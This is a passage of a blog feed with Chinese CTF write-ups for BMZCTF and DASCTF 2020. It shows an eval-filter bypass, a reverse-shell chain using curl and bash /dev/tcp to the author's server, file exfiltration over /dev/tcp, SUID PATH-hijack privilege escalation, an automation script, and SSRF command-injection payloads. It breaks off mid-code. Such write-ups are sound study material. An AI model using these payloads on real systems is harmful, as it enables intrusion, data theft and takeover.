punctuation">,</span><span class="token single-quoted-string string">'post'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'get'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'session'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ascii'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'eval'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'replace'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'exec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cookie'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'$'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'include'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'print'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'scan'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'system'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'func'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ini_'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'passthru'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'pcntl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'open'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'log'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'current'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'local'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'require'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"BMZCTF"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，但肯定还有能用的，<code>&lt;、&gt;、&quot;</code>因为<code>htmlspecialchars</code>也是不能用的</p><p>往无参数RCE方向走发现不太可行，最后利用<code>base_convert</code>构造语句</p><p>把<code>system</code>由base36转为base10，利用<code>base_convert(2146934604002,10,36)</code>发现可以执行系统命令，于是想读取根目录flag发现<code>/</code>传不进去，于是继续<code>base_convert(16191,10,36)</code>，利用<code>chr</code>函数转换<code>/</code>，最终读取flag</p><p>payload：<code>cmd=base_convert(2146934604002,10,36)(base_convert(16191,10,36)(47).flag);</code></p><img src="/article/bmzctf2020/image-20201228205633315.png" class="" title="image-20201228205633315" loading="lazy"><hr><h4 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h4><p>主要考察反弹shell，提权</p><p>打开得源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'d'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'e'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'q'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'g'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'i'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'+'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'k'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'m'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&lt;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\>'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'o'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'w'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\~'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\^'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\@'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&amp;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\%'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\"'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\*'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\('</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\)'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\!'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\='</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\.'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\['</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\]'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#125;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#123;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match <span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blacklisted</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>命令执行，<code>ip</code>经过blacklist过滤后exec执行，但是测着发现foreach会每次取一位然后来执行，执行多次，也就是说只要不含<code>b</code>就可以执行，这里可以直接执行，但限制了18个字符的长度限制发挥，尝试反弹shell，明显反弹shell第一个单词<code>bash</code>会被过滤，另寻方法。</p><p>首先就执行<code>find / -name fl*&gt;1</code>，执行后输出结果到文件1，结果发现根本就没有flag！</p><p>测试echo可写，于是准备写个一句话木马，结果发现写的.php不执行，应该是写了规则。</p><p>于是准备写个<code>.htaccess</code>，结果一写直接500内部服务报错。</p><p>老实弹shell吧。</p><p>想直接写<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code>，结果发现<code>&amp;</code>写不进去，测试发现靶机可连外网，于是在自己服务器上写个名为1的文件，内容为<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code></p><p>再在靶机写个文件<code>1d</code>，内容为<code>curl ip/1&gt;1</code></p><p>运行<code>sh 1d</code>，发现不行，估计没有执行权限，赋予，<code>chmod 777 1d</code>，靶机运行了curl命令，访问我的服务器下载了文件1，这样就成功写了反弹shell的命令</p><p>在我的服务器监听端口，<code>nc -lvp [port]</code></p><p>再给1赋予执行权限<code>chmod 777 1</code>，需要用bash执行，可是不可以含有<code>b</code>，于是利用<code>?</code>和<code>[a-c]</code>，即执行<code>/?in/[a-c]ash 1</code></p><p>我的服务器成功getshell</p><img src="/article/bmzctf2020/image-20201228211635023.png" class="" title="image-20201228211635023" loading="lazy"><p>根目录下没有发现flag，也没有readflag，找也找不到flag，有个<code>start.sh</code>，读取一下看看</p><pre class="language-sh" data-language="sh"><code class="language-sh">www-data@2a4c1fe2f663:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;start.shcat &#x2F;start.sh#!&#x2F;bin&#x2F;bash chmod 755 index.phpgcc &#x2F;root&#x2F;demo.c -o lovemv love &#x2F;usr&#x2F;bin&#x2F;lovechmod u+s &#x2F;usr&#x2F;bin&#x2F;loverm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logrm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</code></pre><p>关键在这个<code>/user/bin/love</code></p><p>读出来看看，服务器开监听端口，靶机shell执行<code>cat /usr/bin/love &gt; /dev/tcp/[ip]/[port]</code></p><img src="/article/bmzctf2020/image-20201228212753119.png" class="" title="image-20201228212753119" loading="lazy"><p>成功拿到文件，拷下来反编译一下(web狗汗颜)</p><img src="/article/bmzctf2020/image-20201228212718787.png" class="" title="image-20201228212718787" loading="lazy"><p>结果就是系统执行个ps命令</p><p>结合find发现了的一点东西</p><img src="/article/bmzctf2020/image-20201228211807363.png" class="" title="image-20201228211807363" loading="lazy"><p><code>/root</code>目录没有权限，也许可能考点就是提权了</p><p>这是一个具有SUID权限的程序，在tmp目录写个内容为<code>/bin/bash</code>的ps文件，添加进环境变量，这样执行程序调用ps命令会优先从这里执行，而这里是我们伪造的ps命令，然后相当于以高级权限执行了<code>/bin/bash</code>。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span> /tmp/ps<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>/usr/bin/love</code></pre><p>成功提权，直接<code>cat /root/flag</code></p><img src="/article/bmzctf2020/image-20201228213633573.png" class="" title="image-20201228213633573" loading="lazy"><p>理解了师傅之前说的，提权，才是开始。</p><p>是的，权限真香，这才刚刚开始</p><p>后面再研究吧</p><p>附上一键弹shell脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/26 20:36@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://www.bmzclub.cn:21257/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?ip="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"curl [ip]/[filename]>1"</span>    i <span class="token operator">=</span> <span class="token number">0</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"echo '"</span> <span class="token operator">+</span> payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\c'>1d"</span>            execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">5</span>            flag <span class="token operator">-=</span><span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string">"echo '"</span><span class="token operator">+</span>payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\c'>>1d"</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        i <span class="token operator">+=</span><span class="token number">5</span>    check<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"1d"</span><span class="token punctuation">)</span>    <span class="token comment"># bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"sh 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"/?in/[a-c]ash 1"</span><span class="token punctuation">)</span></code></pre><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很有收获，不枉这两题，尤其的第二题，非常有价值。</p><p>当然不能小看第一题，别看WP短短几行，背后是无数次的尝试与探索，第二题更是如此。</p><p>2020年最后一份WP，还有很长路要走，加油吧。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020DASctf-Writeup</title>
      <link href="article/dasctf2020/"/>
      <url>article/dasctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020DASCTF-Write-up"><a href="#2020DASCTF-Write-up" class="headerlink" title="2020DASCTF Write-up"></a>2020DASCTF Write-up</h2><p>队伍名称：Test1024</p><p>队伍成员：</p><p>gyy，Trick，X06</p><p>队伍情况：</p><hr><img src="/article/dasctf2020/image-20201226160717993.png" class="" title loading="lazy"><img src="/article/dasctf2020/image-20201226160703650.png" class="" title="range" loading="lazy"><hr><p>继续学习吧，还是太菜了</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h4><p>2020网鼎杯线下半决赛web_babyJS，近乎原题</p><p>打开即为空的json</p><img src="/article/dasctf2020/image-20201226161339893.png" class="" title="image-20201226161339893" loading="lazy"><p>给了源码，关键web逻辑<code>routes\index.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> url<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child_process<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> request<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blacklist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'127.0.0.1.xip.io'</span><span class="token punctuation">,</span><span class="token string">'::ffff:127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token string">'[::1]'</span><span class="token punctuation">,</span><span class="token string">'::1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> u<span class="token operator">=</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\"\']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> log<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo  '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'>>/tmp/log</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>child_process<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>data<span class="token operator">:</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/tmp/log'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> u <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url<span class="token punctuation">;</span><span class="token keyword">var</span> urlObject<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>urlObject<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dest<span class="token operator">=</span>urlObject<span class="token punctuation">.</span>href<span class="token punctuation">;</span><span class="token function">request</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>result<span class="token punctuation">,</span>body</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>有个debug路径，请求会判断是不是本地回环访问，即<code>127.0.0.1</code>等，不是则返回空json。如果是本地访问就会读取get中url参数，去除单双引号用nodejs的url.parse解析，解析后的url拼接到shell命令中执行，输出<code>/tmp/log</code>再返回内容。</p><p>由此，应先POST<code>/debug</code>， 在<code>url</code>参数中绕过blacklist，让程序再GET请求自己的<code>/debug</code>路径，之后构造注入命令。</p><p>考察一个SSRF，构造payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527@xx&quot;&#125;</code>最后闭合引号</p><p>然后考虑把flag文件复制到<code>/tmp/log</code>，利用<code>$IFS</code></p><p>最终payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527;%2527@xx;cp$IFS/tmp/flag$IFS/tmp/log%00&quot;&#125;</code></p><hr><h4 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h4><p>神奇的phar反序列化</p><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'template.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'tp1'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp1.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp2'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp2.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp3'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp3.tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 